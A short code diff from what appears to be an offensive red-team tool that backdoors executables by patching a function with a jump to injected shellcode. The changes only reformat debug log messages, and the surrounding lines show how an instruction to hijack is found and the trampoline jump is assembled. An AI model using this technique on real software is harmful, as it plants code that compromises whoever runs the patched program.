@@ -32,14 +32,14 @@ class FunctionBackdoorer:
 
 
     def backdoor_function(self, function_addr: int, shellcode_addr: int, shellcode_len: int):
-        logger.debug("--[ Backdooring exe function at 0x{:X} with jump to carrier at 0x{:X}".format(function_addr, shellcode_addr))
+        logger.debug("    Backdooring exe function at 0x{:X} with jump to carrier at 0x{:X}".format(function_addr, shellcode_addr))
         
         addr = self.find_suitable_instruction_addr(function_addr)
         if addr is None:
             raise Exception("Couldn't find a suitable instruction to backdoor")
 
         compiled_trampoline = assemble_relative_jmp(addr, shellcode_addr)
-        logger.debug("---[ Backdoor Instruction at 0x{:X} (offset to shellcode: 0x{:X})".format(addr, shellcode_addr - addr))
+        logger.debug("      Backdoor Instruction at 0x{:X} (offset to shellcode: 0x{:X})".format(addr, shellcode_addr - addr))
         
         # Check for overlap
         it = IntervalTree()
@@ -63,7 +63,7 @@ class FunctionBackdoorer:
 
     def find_suitable_instruction_addr(self, startOffset, length=256):
         """Find a instruction to backdoor. Recursively."""
-        logger.debug("---[ find suitable instruction to hijack starting from 0x{:X} len:{} depthopt:{}".format(
+        logger.debug("      find suitable instruction to hijack starting from 0x{:X} len:{} depthopt:{}".format(
             startOffset, length, self.depth_option))
 
         if self.depth_option == DEPTH_OPTIONS.LEVEL1:
